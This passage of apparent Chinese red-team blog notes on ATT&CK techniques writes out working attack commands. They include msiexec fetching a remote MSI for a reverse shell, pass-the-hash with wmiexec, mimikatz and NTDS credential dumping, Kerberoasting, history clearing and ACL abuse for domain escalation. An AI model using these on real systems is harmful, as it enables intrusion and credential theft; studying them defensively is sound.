Installer的命令行Windows实用程序。攻击者可能会使用msiexec.exe启动恶意MSI文件以执行代码。攻击者可以使用它来启动本地或网络可访问的MSI文件。Msiexec.exe也可用于执行DLL。\n\nMsfvenom生成反弹shell的txt文件。\n\n![1574764009355](Execution.assets/1574764009355.png)\n\n使用msiexec.exe执行\n\n```\nmsiexec.exe /q /i testMsiexec.txt\n```\n\n执行之后反弹shell成功\n\n![1574764046496](Execution.assets/1574764046496.png)\n\n能够反弹shell但是立马就会断。还有就是使用msi格式的也可以反弹shell，同时都没有被当前使用的杀毒软件查杀，但是dll类型的是被查杀了。\n\n同样可以执行远程文件：\n\n```\npython -m SimpleHTTPServer 80\nmsiexec /q /i http://192.168.1.109/1.msi\n```\n\n### mavinject.exe\n\nMavinject.exe是一个允许代码执行的Windows实用程序。Mavinject可用于将DLL注入到正在运行的进程中。\n\n命令为：\n\n```\n\"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe\" <PID> /INJECTRUNNING <PATH DLL>\nC:\\Windows\\system32\\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>\n```\n\n官方的下载地址没有找到，下面两个链接可以参考，不过建议在虚拟机执行：\n\nhttps://www.pconlife.com/viewfileinfo/mavinject-exe/\n\nhttps://www.winpcware.com/extension/exe/mavinject-exe\n\n### SyncAppvPublishingServer.exe\n\nSyncAppvPublishingServer.exe可以在执行powershell.exe的情况下执行powershell脚本。可以用于绕过APPLocker的限制。\n\n### Odbcconf.exe\n\nOdbcconf.exe是一个Windows实用程序，允许您配置开放式数据库连接（ODBC）驱动程序和数据源名称。该实用程序可能被滥用来执行与Regsvr32等效的功能，并使用REGSVR选项来执行DLL。\n\n示例命令：\n\n```\nodbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"}\n```\n\n## Signed Script Proxy Execution-T1216\n\n使用受信任证书签名的脚本可用于代理恶意文件的执行。此行为可能会绕过签名验证限制和不考虑使用这些脚本的应用程序白名单解决方案。\n\nPubPrn.vbs由Microsoft签名，可用于代理远程站点的执行。主要作用是将打印机发布到AD域服务。\n\n默认路径为：\n\n```\nC:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\nC:\\Windows\\SysWOW64\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\n```\n\n官方给的例子，可以通过这个脚本把\\\\\\\\Server1上的所有打印机发布到MyDomain.company.Com域中\n\n```\ncscript Ppubprn Server1 \"LDAP://CN=MyContainer,DC=MyDomain,DC=company,DC=Com\"\n```\n\n用于执行命令：\n\n```\ncscript /b C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct\n```\n\n![1574765708547](Execution.assets/1574765708547.png)\n\nSct脚本内容：\n\n```\n<?XML version=\"1.0\"?>\n<scriptlet>\n\n<registration\n    description=\"Bandit\"\n    progid=\"Bandit\"\n    version=\"1.00\"\n    classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\"\n    remotable=\"true\"\n\t>\n</registration>\n\n<script language=\"JScript\">\n<![CDATA[\n\t\tvar r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");\n]]>\n</script>\n</scriptlet>\n```\n\n## Source-T1153\n\nMACOS\n\n## Space after Filename-T1151\n\nMACOS\n\n## Third-party Software-T1072\n\n原文说的是第三方软件，所以理解为是一种思路吧。\n\n## Trap-T1154\n\nTrap是Linux下的命令，个人认为原文说的更适用于权限维持中，所以请至权限维持一章看细节。\n\n## Trusted Developer Utilities-T1127\n\n这个说的是在一些开发者工具中包含的一些exe文件，能够用于执行任意系统命令。比如：\n\n```\nMSBuild.exe\nDNX.exe\nrcsi.exe\nWinDbg.exe\ncdb.exe\ntracker.exe\n```\n\n选一个MSBuild.exe主要说明一下，首先MSBuild.exe可以通过执行C#文件内容来执行shellcode生成XML或者csproj格式的文件方式多种多样，可以直接通过Empire生成：\n\n![1574765872888](Execution.assets/1574765872888.png)\n\n然后直接将生成到/tmp/目录下的launcher.xml文件放到windows下使用MSBuild.exe执行即可。但是只有.NET 4.0以上的版本才可以执行成功。\n\n![1574765897790](Execution.assets/1574765897790.png)\n\n## Windows Management Instrumentation-T1047\n\nWindows Management Instrumentation（WMI）是一种Windows管理功能，可为Windows系统组件的本地和远程访问提供统一的环境。它依赖于本地和远程访问的WMI服务以及远程访问的服务器消息块（SMB）和远程过程调用服务（RPCS）。RPCS通过135端口运行。\n\n \n\n可以直接通过wmic命令来使用wmi功能（wmi不能执行命令，但是可以创建进程执行文件）：\n\n```\nwmic /node:192.168.144.177 /user:administrator /password:admin123!@# process call create calc.exe\n```\n\n![1574765953625](Execution.assets/1574765953625.png)\n\n这时能够看到进程，但是并没有弹出，说明已经执行了命令\n\n![1574765965203](Execution.assets/1574765965203.png)\n\n也可以通过一些工具来执行代码，比如winexec.exe：\n\n```\nwmiexec.exe -hashes 00000000000000000000000000000000:8f909fdb472d0b85cddb3e36669a9b07 administrator@192.168.144.177 \"whoami\"\n```\n\n这里是通过HASH值进行执行的命令，实际上这就是一次Pass The Hash的攻击技术，通过NTLM协议验证，然后进行远程访问执行命令。\n\n![1574766158959](Execution.assets/1574766158959.png)\n\n## Windows Remote Management-T1028\n\nWINRM是WS-Management协议的Microsoft实现，该协议的目的是为跨多种类型的设备（包括固件）和操作系统的管理操作提供一致性和互操作性。WS-Management协议的当前实现基于以下标准规范：HTTPS，HTTP上的SOAP（WS-I配置文件），SOAP 1.2，WS-Addressing，WS-Transfer，WS-Enumeration和WS-Eventing。\n\n在拥有本地管理员权限以及目的的权限的情况下可以通过WINRM的WSMAN进行执行命令。\n\n```\nInvoke-Command -ComputerName exchange2012 -ScriptBlock {ipconfig}\n```\n\n![1574766195009](Execution.assets/1574766195009.png)\n\n```\nInvoke-Command -ComputerName exchange2012 -ScriptBlock {whoami}\n```\n\n![1574766264740](Execution.assets/1574766264740.png)\n\n通过抓包可以看到走的是HTTP协议，命令以及执行结果的传输全部进行了加密\n\n![1574766292400](Execution.assets/1574766292400.png)\n\n![1574766297358](Execution.assets/1574766297358.png)\n\n同时mimikatz还支持使用WINRM进行远程获取LSASS中存储的hash值\n\n```\nImport-Module .\\Invoke-Mimikatz.ps1\nInvoke-Mimikatz -ComputerName exchange2012\n```\n\n![1574766323851](Execution.assets/1574766323851.png)\n\n同时也可以用于持久化，将原本没有开启WINRM的主机使用下列命令开启，即可通过WINRM服务远程连接此主机。\n\n```\nEnable-PSRemoting –Force\n```\n\n![1574766377773](Execution.assets/1574766377773.png)\n\n在一些情况下可能无法通过WinRM连接，就是需要一些其他的配置。\n\n```\nwinrm quickconfig\nwinrm set winrm/config/Client @{AllowUnencrypted = \"true\"}\nSet-Item WSMan:localhost\\client\\trustedhosts -value *\n```\n\n","categories":["ATT&CK"]},{"title":"ATT&CK_Credential Access","url":"/2020/12-18-ATT&CK_Credential Access/","content":"\n## Account Manipulation-T1098\n\n账户操纵主要提到了修改权限，修改凭据，添加或更改权限组等能够进行的账户操作，更多情况下认为应该放在权限维持下面，并且这一项可以作为一个\n\n## Bash History-T1139\n\nBash使用“history”实用程序跟踪用户在命令行上键入的命令，有可能能够看到历史记录保存的此前登录系统的密码（亲身遇到过）\n\n查看：\n\n```bash\ncat ~/.bash_history\nhistory\n```\n\n**隐藏命令：**\n\n```bash\nset +o history 不会将任何当前会话写入日志。可以在会话期间任何时间运行，并隐藏所有命令。\nset -o history 重启日志记录，但是会记录 set 命令，所以会发生一些明显的变化。\nhistory -c 彻底清除历史（存在一个问题，就是bash_history文件其实还存在，ssh退出再上去依然能看到，所以还是把bash_history文件删除）\n```\n\n## Brute Force-T1110\n\n主要说了一些暴力破解的方式，而工具多种多样，一般情况下的爆破可以基于短时间内访问失败次数进行检测。比较有名的就是Hydra了。\n\n![1574317122700](Credential_Access.assets/1574317122700.png)\n\n## Credential Dumping-T1003\n\n### SAM(Security Accounts Manager)\n\nSAM包含主机的本地账户的HAS值（每一台主机中都存在一个SAM），利用工具：\n\n​    **pwdumpx.exe**\n\n​        下载了pwdump7，直接执行exe文件即可\n\n![1574317247983](Credential_Access.assets/1574317247983.png)\n\n​    **gsecdump**\n\n​        gsecdump -a 查看SAM\n\n​    **Mimikatz**\n\n```\nprivilege::debug(切换至管理员权限)\ntoken::elevate\nlsadump::sam\n```\n\n![1574317265058](Credential_Access.assets/1574317265058.png)\n\n​    **secretsdump.py**\n\n​    **Invoke-PowerDump.ps1**\n\n```\nImport-module Invoke-PowerDump.ps1\nInvoke-PowerDump\n```\n\n![1574317328740](Credential_Access.assets/1574317328740.png)\n\n**Reg从注册表中提取SAM**\n\n​    命令行执行：\n\n```\nreg save HKLM\\sam c:\\sam\nreg save HKLM\\system c:\\system\n```\n\n​    这种方式提取的文件是乱码，明文需要通过samdump2或者mimikatz再提\n\n![1574317367660](Credential_Access.assets/1574317367660.png)\n\n```\nlsadump::sam /sam:sam /system:system\n```\n\n![1574317383054](Credential_Access.assets/1574317383054.png)\n\n### Local Security Authority (LSA) \n\n本地安全机构（LSA）是受Microsoft Windows保护的子系统，它是Windows客户端身份验证体系结构的一部分，该体系结构对本地计算机进行身份验证并创建登录会话。\n\nLSA是一个认证机制,在负责Lsa的windows进程lsass中实际存储了系统的账户密码明文和加密过的HASH值。\n\n### NTDS\n\nNTDS不同于SAM，SAM保存本地，NTDS保存在域控，保存了域内所有的HASH\n\n**卷影复制**\n\n卷影副本也称为快照，是存储在 Data Protection Manager (DPM) 服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享、文件夹和文件的完整时间点副本。\n\n（勒索软件通常会删除卷影副本：C:\\Windows\\Sysnative\\vssadmin.exe\"Delete Shadows /All /Quiet）\n\n```\nvssadmin create shadow /for=c:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit c:\\\n```\n\n![1574317582705](Credential_Access.assets/1574317582705.png)\n\n**secretsdump.py**\n\nsecretsdump.py在这里的作用是从已经导出的ntds.dit文件中导出明文。Mimikatz也可以达到相同的效果\n\n```\npython secretsdump.py -ntds /demo/ntds/ntds.dit -system /demo/ntds/SYSTEM LOCAL\n```\n\n![1574317609798](Credential_Access.assets/1574317609798.png)    \n\n**ntdsutil.exe**\n\n可以直接通过ntdsutil命令导出ntds.dit文件\n\n```\nntdsutil \"ac i ntds\" \"ifm\" \"create full c:temp\" q q\n```\n\n![1574317634601](Credential_Access.assets/1574317634601.png)\n\n**Invoke-NinjaCopy.ps1**\n\n使用命令\n\n```\nImport-Module .\\invoke-ninjacopy.ps1\nInvoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination .\\sam.hive\nInvoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SYSTEM -LocalDestination .\\system.hive\n```\n\n导出的文件同样需要通过类似于mimikatz这样的工具导出为明文。\n\n还有像Ntdsdump之类的工具，不再一一介绍。\n\n### Plaintext Credentials\n\n比如使用mimikatz和procdump组合使用导出系统中的密码\n\n也可以直接使用mimkatz命令:\n\n```\nprivilege::debug\nsekurlsa::logonPasswords\n```\n\n![1574317707084](Credential_Access.assets/1574317707084.png)\n\n上图是在windows server 2008中的截图，在windows server 2012中lsass中已经不存储明文。\n\n![1574318018748](Credential_Access.assets/1574318018748.png)\n\n## Credentials in Files-T1081\n\n提到了关于文件中保存的凭据或者密码文件\n\n包括电子邮件客户端、谷歌浏览器、等，涉及到的一些工具暂未找到\n\n其中提到了Get-GPPPassword.ps1\n\n同时也可以使用命令快速搜索系统文件中的密码\n\n例，通过findstr搜索带有password字段的文件：\n\n```\nfindstr /si password *.txt\nfindstr /si password *.xml\nfindstr /si password *.ini\n```\n\n![1574318204038](Credential_Access.assets/1574318204038.png)\n\n## Credentials in Registry-T1214\n\n可以通过命令\n\n```\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n```\n\n分别查看本地机器和当前用户的含有password的项\n\n## Exploitation for Credential Access-T1212\n\n攻击者利用操作系统漏洞，或者是身份验证机制的错误来进行攻击。偏思路型，原文中举了几个例子，其中一个是MS14-068，直接使用利用工具可以申请具有域管理员权限的票据\n\n```\nMS14-068.exe -u normal@test.com -s S-1-5-21-1406004368-3818689962-3591297438-1105 -d 192.168.3.100 -p Server1\n```\n\n![1574318277629](Credential_Access.assets/1574318277629.png)\n\n## Forced Authentication-T1187\n\n当Windows系统尝试连接到SMB资源时，它将自动尝试进行身份验证，并将当前用户的凭据信息发送到远程系统。\n\n当SMB被阻止或者失败时，WebDAV会做为备用协议。WebDAV是HTTP的扩展，通常通过TCP端口80和443运行。\n\n攻击者可以利用这种方式诱导受害者访问其他资源。\n\n例：\n\n通过页面（钓鱼邮件等）中嵌入的代码发起SMB请求，然后进行SMB中继操作，或者用于检索文件\n\n![1574318337349](Credential_Access.assets/1574318337349.png)\n\n## Hooking-T1179\n\n类似于进程注入，攻击者可以使用钩子在另一个进程的上下文中加载和执行恶意代码，从而屏蔽执行过程，同时还允许访问进程的内存和可能的特权。通过正常使用调用功能时，使用HOOK机制能够通过连续调用来提供持久性，或者是抓取键盘输入，从而获取被攻击着的一些账号密码。\n\n这里直接使用逆向工程核心原理中的HOOK教程的代码来进行演示HOOK技术，拿键盘输入举例，首先了解一下在键盘输入时常规的Windows消息流：\n\n```\n1、 发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]。\n2、 OS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中。\n3、 应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应事件的处理程序来进行处理。\n```\n\n![1574318455954](Credential_Access.assets/1574318455954.png)\n\n从上图可以更形象的来理解这个过程。\n\n下面直接利用原书中的示例代码来进行实验，我们通过编写的钩子（HOOK）文件来拦截notepad.exe的输入，首先使用C++生成一个HookMain.exe文件，源代码为HookMain.cpp:\n\n```c++\n#include \"stdio.h\"\n#include \"conio.h\"\n#include \"windows.h\"\n\n#define\tDEF_DLL_NAME \"KeyHook.dll\"\n#define\tDEF_HOOKSTART \"HookStart\"\n#define\tDEF_HOOKSTOP \"HookStop\"\n\ntypedef void (*PFN_HOOKSTART)();\ntypedef void (*PFN_HOOKSTOP)();\n\nvoid main()\n{\n\tHMODULE hDll = NULL;\n\tPFN_HOOKSTART HookStart = NULL;\n\tPFN_HOOKSTOP HookStop = NULL;\n\tchar ch = 0;\n\n\thDll = LoadLibraryA(DEF_DLL_NAME);\n    if( hDll == NULL )\n    {\n        printf(\"LoadLibrary(%s) failed!!! [%d]\", DEF_DLL_NAME, GetLastError());\n        return;\n    }\n\n\tHookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);\n\tHookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);\n\tHookStart();\n\tprintf(\"press 'q' to quit!\\n\");\n\twhile( _getch() != 'q' )\t;\n\tHookStop();\n\tFreeLibrary(hDll);\n}\n\n```\n\n然后再生成一个DLL文件，名为KeyHook.dll，源代码为KeyHook.cpp:\n\n```c++\n#include \"stdio.h\"\n#include \"windows.h\"\n\n#define DEF_PROCESS_NAME \"notepad.exe\"\n\nHINSTANCE g_hInstance = NULL;\nHHOOK g_hHook = NULL;\nHWND g_hWnd = NULL;\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)\n{\n\tswitch( dwReason )\n\t{\n        case DLL_PROCESS_ATTACH:\n\t\t\tg_hInstance = hinstDLL;\n\t\t\tbreak;\n        case DLL_PROCESS_DETACH:\n\t\t\tbreak;\n\t}\n\treturn TRUE;\n}\n\nLRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)\n{\n\tchar szPath[MAX_PATH] = {0,};\n\tchar *p = NULL;\n\tif( nCode >= 0 )\n\t{\n\t\tif( !(lParam & 0x80000000) )\n\t\t{\n\t\t\tGetModuleFileNameA(NULL, szPath, MAX_PATH);\n\t\t\tp = strrchr(szPath, '\\\\');\n\t\t\tif( !_stricmp(p + 1, DEF_PROCESS_NAME) )\n\t\t\t\treturn 1;\n\t\t}\n\t}\n\treturn CallNextHookEx(g_hHook, nCode, wParam, lParam);\n}\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\t__declspec(dllexport) void HookStart()\n\t{\n\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);\n\t}\n\t__declspec(dllexport) void HookStop()\n\t{\n\t\tif( g_hHook )\n\t\t{\n\t\t\tUnhookWindowsHookEx(g_hHook);\n\t\t\tg_hHook = NULL;\n\t\t}\n\t}\n#ifdef __cplusplus\n}\n#endif\n```\n\n将代码编译成对应的exe和dll文件之后我们进行测试。\n\n首先打开HookMain.exe程序，然后程序会自动调用对应的DLL文件，然后使用ProcessExplorer工具查看发现此时notepad.exe还没有调用Keyhook.dll\n\n![1574318618698](Credential_Access.assets/1574318618698.png)\n\n在notepad.exe中尝试输入字母发现并不能输入，再次Search发现notepad已经调用了KeyHook.dll文件，键盘的输入被拦截。\n\n![1574318631944](Credential_Access.assets/1574318631944.png)\n\n这是一个简单的消息钩子，使用的API是SetWindowsHookEx()这个API，在使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入到响应进程，然后调用注册的钩子过程。攻击者可以通过钩子获取键盘输入、执行恶意代码、等等操作，同时还允许访问进程的内存和可能的特权。\n\n## Input Capture-T1056\n\n主要提到了键盘记录（实际上和上面提到的Hooking是相同的原理），和门户安装代码远程捕获用户凭据，主要关键点是用户输入的内容\n\n提到了一些黑客使用的工具。\n\n比如Cobalt Strike、Chopstick、gh0st、powersploit中的Get-Keystrokes等…工具非常多\n\n这里使用Get-Keystrokes来举例，使用命令运行脚本之后，在屏幕的其他位置敲击键盘输入字符时发现Get-Keystrokes记录了输入的内容：\n\n```\n. .\\Get-Keystrokes.ps1\nGet-Keystrokes\n```\n\n![1574318973123](Credential_Access.assets/1574318973123.png)\n\n## Input Prompt-T1141\n\n伪造页面诱导受害者输入账号密码，算是一种思路而不是一种具体的技术，主要是伪造比如银行、WIFI等页面。\n\n## Kerberoasting-T1208\n\n批量申请TGS票据然后进行爆破\n\n```\nImport-module Invoke-Kerberoast.ps1\nInvoke-kerberoast –outputformat hashcat | fl\n```\n\n![1574319151262](Credential_Access.assets/1574319151262.png)\n\n然后将得到的内容使用hashcat工具爆破\n\n```\nhashcat64.exe –m 13100 test1.txt password.list --force\n```\n\n![1574319165232](Credential_Access.assets/1574319165232.png)\n\n## Keychain-T1142\n\nMACOS\n\n## LLMNR/NBT-NS Poisoning-T1171\n\n攻击者通过响应LLMNR流量来欺骗请求发起者。可以结合wpad进行中间人攻击，或者是获取NTLM HASH进行爆破。\n\n所用工具：Pupy、Responder、MSF\n\n例：\n\n```\npython2 Responder.py -I eth0\n```\n\n![1574319221984](Credential_Access.assets/1574319221984.png)\n\n## Network Sniffing-T1040\n\n网络嗅探是指使用系统上的网络接口来监视或捕获通过有线或无线连接发送的信息。\n\n方式多种多样上文中说的Responder也是其中一种方式。工具还提到了Responder、Impacket等等。\n\n## 未完成Password Filter DLL-T1174\n\nWindows中组策略中存在密码复杂度的配置\n\ngpedit.msc -> 本地计算机策略 -> 计算机配置 -> Windows设置 -> 安全设置 -> 帐户策略 -> 密码策略 -> 密码必须符合复杂性要求\n\n如果密码策略满足不了对密码复杂度的要求，则可以使用Password Filter DLL进一步提高密码复杂度。\n\n## Private Keys-T1145\n\n通过搜集系统私钥来进行攻击，比如Linux中通过私钥登录SSH服务。\n\nMimikatz通过windowAPI来提取密钥\n\n## Securityd Memory-T1167\n\nMACOS\n\n## Steal Web Session Cookie-T1539\n\n说到窃取Cookie的方式实际上是很多的，比如通过存储型的XSS，在ATT&CK的官网中还提到了中间人，不管是通过什么样的方式，最终的目的都是为了获取Cookie。\n\n这里我想到了几个月前写的一个文章，关于Windows下利用DPAPI本地窃取Cookie的方式，主要是通过DPAPI（Data Protection Application Programming Interface）的机制来获取其他用户的Cookie。\n\n篇幅太长，所以不写在这里了，链接：\n\n## Two-Factor Authentication Interception-T1111\n\n双因素认证的拦截，描述了攻击者可能通过一些键盘记录之类的方式来获取双因素认证中的密钥。不感兴趣懒得复现。","categories":["ATT&CK"]},{"title":"AD域中的ACL研究","url":"/2020/12-18-AD域中的ACL研究/","content":"\n安全客链接：https://www.anquanke.com/post/id/212163\n\n## ACL的概念和作用\n\n### ACM：\n\n​\t想要了解ACL首先需要了解Access Control Model（访问控制模型），根据官网（https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-model）给出的定义：\n\n​\t访问控制模型能够控制进程访问一些安全对象，或者是控制进程执行各种系统管理任务。原文：The access control model enables you to control the ability of a process to access securable objects or to perform various system administration tasks.\n\n访问模型包含哪些部分：\n\n```\n1、Access Tokens（访问tokens）\n2、Security Descriptors（安全描述符）\n\ta、Discretionary Access Control List (DACL)\n\tb、System Access Control List (SACL)\nAccess Control Lists（ACL）\nAccess Control Entries（ACE）\nAccess Rights and Access Masks（访问权限和访问掩码）\n```\n\n### Access Token：\n\n当线程与[安全对象](https://docs.microsoft.com/zh-cn/windows/win32/secauthz/securable-objects)交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包括以下信息：\n\n```\nThe security identifier (SID) for the user's account\nSIDs for the groups of which the user is a member\nA logon SID that identifies the current logon session\nA list of the privileges held by either the user or the user's groups\nAn owner SID\nThe SID for the primary group\nThe default DACL that the system uses when the user creates a securable object without specifying a security descriptor\nThe source of the access token\nWhether the token is a primary or impersonation token\nAn optional list of restricting SIDs\nCurrent impersonation levels\nOther statistics\n```\n\n### Security Descriptors安全描述符\n\nSID（Security Identifiers）翻译成安全标识符。\n\n安全描述符标识对象的所有者，并包含以下访问控制列表：\n\n​\t1、Discretionary Access Control List (DACL)  自由访问控制列表\n\n​\t2、System Access Control List (SACL) 系统访问控制列表\n\n每一种控制列表中都存在若干条ACE（Access Control Entries）\n\n![1571729717192](ACL学习记录.assets/1571729717192.png)\n\n用https://wenku.baidu.com/view/dba5b16e1eb91a37f1115cec.html这个链接下的一个图可以很清晰的说明什么是安全描述符：\n\n![1573981482195](ACL学习记录.assets/1573981482195.png)\n\n可以看到安全描述符由Header、SID和DACL、SACL组成\n\n#### DACL\n\n高级安全设置中的权限就是DACL的列表\n\n![1573981538570](ACL学习记录.assets/1573981538570.png)\n\n#### SACL\n\n高级安全设置中的审核就是SACL的列表\n\n![1573981601165](ACL学习记录.assets/1573981601165.png)\n\n其中的每一条都是一个ACE\n\n#### ACE\n\nACE是针对特定用户或特定组的单个权限授予（或拒绝权利）的配置结构。ACE有许多不同类型，但是在Active Directory的权限中，只有四种不同的含义，两种分别用于授予和拒绝权限。\n\n1、Access Allowed ACE：\n\n![ACE](ACL学习记录.assets/security-descriptor-05.gif)\n\n这种类型的ACE类型始终为0，设计目的是为了将权限轻松的分配给整个对象。ACE Flags确定这是继承权限还是显式给定的权限。所有此对象的子对象都会继承为ACE Type为0。\n\n2、Access Allowed Object ACE:\n\n![Access Allowed Object ACE](ACL学习记录.assets/security-descriptor-06.gif)\n\n此类ACE的类型始终为5，用于指定对象的某些属性的权限\n\n3、Access Denied ACE\n\n![æç»è®¿é®ACE](ACL学习记录.assets/security-descriptor-07.gif)\n\n此类ACE的值始终为1，用于简单的撤销整个对象的权限。ACE标志确定这是继承还是显示分配的撤销权限，并且所有的子对象都会继承这个权限。\n\n4、Access Denied Object ACE\n\n![Access Denied Object ACE](ACL学习记录.assets/security-descriptor-08.gif)\n\n此类ACE的类型始终为6，此对象可以撤销ACE特殊权限或有限的权限，例如针对某些属性撤销，这里提供的有和类型为5的ACE相同的例子（Object Type GUID），Flags字段指示是否存在对象类型字段或者继承类型字段，或者两者都有。\n\n#### Access Mask\n\n在ACE中有Access Mask这个字段，它代表着此条ACE所对应的权限\n\n#### Trustees\n\n​\tTrustees的意思为受委托人，受托者是一个ACE所应用到的用户账户，组账户或者是登录会话。也就是说，谁是某一个ACE的受托者，那么这条ACE中的Access Mask所对应的权限（可能是拒绝可能是通过）就会赋予受托者。\n\n![1574175170641](ACL学习记录.assets/1574175170641.png)\n\n### 安全描述符枚举\n\n通过System.DirectoryServices.DirectorySearcher和System.DirectoryServices.SecurityMasks类可以对域内的安全描述符进行枚举：\n\n```\n$Searcher = New-Object System.DirectoryServices.DirectorySearcher('(samaccountname=xxm)')\n$Searcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Owner\n$Result = $Searcher.FindOne()\n$Result.Properties.ntsecuritydescriptor[0].gettype()\n\n$ADSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity\n$ADSecurityDescriptor.SetSecurityDescriptorBinaryForm($Result.Properties.ntsecuritydescriptor[0])\n$ADSecurityDescriptor\n$ADSecurityDescriptor.Access\n```\n\n这里枚举的是安全描述符中的DACL中的每一个ACE（一共13条，和DACL中对应）：\n\n![1577976056171](ACL学习记录.assets/1577976056171.png)\n\nPowerviewer遍历:\n\n在Powerview的结果中不是根据每一条ACE来显示的，而是把每一个ACE中的每一个权限单独显示一条，所以结果的个数是不等于DACL的数量的。\n\n```\n. .\\powerview.ps1\nGet-DomainObjectAcl -Identity xxm -ResolveGUIDs\n```\n\n![1577977986682](ACL学习记录.assets/1577977986682.png)\n\n任何经过域验证的用户都可以枚举默认域中大多数对象的安全描述符。\n\n### 线程与安全对象之间的交互：\n\n在Access check中，系统将线程访问令牌中的安全信息与安全对象安全描述符中的安全信息进行比较。每一个进程都有一个primary token，用于描述与该进程关联的用户账户的安全上下文。默认情况下，当进程的线程与安全对象进行交互时，系统将使用primary token。\n\n系统检查对象的DACL，查找应用于用户的ACE，并从线程的访问令牌中分组SID，系统会检查每个SID，知道授予或拒绝访问，或者知道没有其他ACE要检查为止。\n\n![clip_image003](ACL学习记录.assets/clip_image003.jpg)\n\n### The Security Reference Monitor(SRM 安全参考监视器)\n\nThe Security Reference Monitor直译为SRM 安全参考监视器，在ACL中排列顺序继承等等都可能影响最后的结果，而SRM就是起到对顺序的评估作用。可参考：\n\nhttps://networkencyclopedia.com/security-reference-monitor/\n\n[https://ldapwiki.com/wiki/Security%20Reference%20Monitor](https://ldapwiki.com/wiki/Security Reference Monitor)\n\n```\n当登录的用户访问对象时，安全性参考监视器将检查对象的安全性描述符，以查看MSFT访问令牌中列出的SID是否与ACE条目匹配。如果存在匹配项，则匹配ACE中列出的安全权限将应用于该用户。\n```\n\n当“域管理员”组的成员请求更改用户密码的能力时，SRM必须决定是否应准许该请求。SRM会评估目标用户的DACL，确定“域管理员”组（进而是该组的成员）对用户具有完全控制权。\n\n评估对象的DACL时，SRM将按规范顺序读取ACE，ACE的排序如下：\n\n```\n1.明确定义的DENY ACE。\n2.明确定义的ALLOW ACE。\n3.继承的DENY ACE。\n4.继承的ALLOW ACE。\n```\n\n## 特权ACL\n\nACL是一个访问控制列表，是整个访问控制模型（ACM）的实现的总称。所以这里说的特权ACL，实际上是特权的权限，比如（复制目录更改所有项）：\n\n```\nGenericAll\nGenericWrite\nWriteOwner(修改所有者)：\nWriteDACL：写DACL（有一个解释是WriteDACL是在攻击链中启用其他权利的权利）\nAllExtendedRights\nAddMembers：将任意用户、组或计算机添加到目标组。滥用方法：Add-DomainGroupMember。\nForceChangePassword：强制更改密码，在不知道当前密码的情况下更改目标用户的密码，滥用方法：Set-DomainUserPassword\nSelf (Self-Membership) \n```\n\n中文系统中的叫法会有一些不一样：\n\n![1571667379668](ACL学习记录.assets/1571667379668.png)\n\n### GenericAll\n\nGenericAll在安全描述符中的Access Mask中进行标识，授予对目标对象的完全控制权，包括WriteDacl 和 WriteOwner 特权。可以使用PowerView中的Set-DomainUserPassword or Add-DomainGroupMember进行利用。\n\n### GenericWrite\n\nGenericWrite也是在Access Mask中进行标识，能够更新目标对象的参数值，比如ScriptPath，可以使用PowerView中的Set-DomainObject进行利用。\n\n![1578145396760](ACL学习记录.assets/1578145396760.png)\n\n### WriteDacl\n\nWriteDacl允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl是在链中启用其他权利的权利。\n\n### WriteOwner\n\nWriteOwner权限允许委托人修改对象的安全描述符的所有者部分。也就是说，假如用户A对administrator用户有这个权限，那么A只能利用这个权限给自己附加其他的权限。\n\n## 针对特权ACL的DEMO\n\n### Organization Management组\n\n![1571651414490](ACL学习记录.assets/1571651414490.png)\n\nOrganization Management组的的组描述为：\n\n```\n此管理角色组成员具有对 Exchange 对象及其在 Exchange 组织中的属性进行管理的权限。另外，成员还可以代表组织中的角色组和管理角色。不应删除此角色组。\n```\n\n在安装Exchange时会创建这个组，赋予其访问Exchange相关活动的权限。除了能访问这些Exchange设置选项之外，该组的成员还可以修改其他Exchange安全组的组成员关系。比如Exchange Trusted Subsystem安全组。这个组是Exchange Windows Permissions安全组的成员之一。\n\nExchange Windows Permissions安全组具备该域对象的writeDACL权限。也就是说只要成为Organization Management组的成员，我们就可以提升成为域管理员权限。\n\n#### 流程\n\n```\n控制了Organization Management组内用户 --> 将用户添加至Exchange Trusted Subsystem --> 再次登录 --> 用户成为Exchange Trusted Subsystem以及Exchange Windows Permission组成员 --> 具有writeDACL权限\n```\n\n### 